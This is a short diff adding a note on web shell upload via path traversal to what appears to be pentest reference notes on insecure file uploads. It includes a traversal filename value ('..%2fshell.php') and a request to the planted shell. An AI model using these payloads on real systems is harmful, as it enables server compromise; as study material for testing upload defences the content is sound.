@@ -20,4 +20,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecur
 
 Content-Type: image/jpeg
 
+# Web shell upload via path traversal
+
+filename="..%2fshell.php"
+
+GET /files/avatars/../shell.php
+
+
 
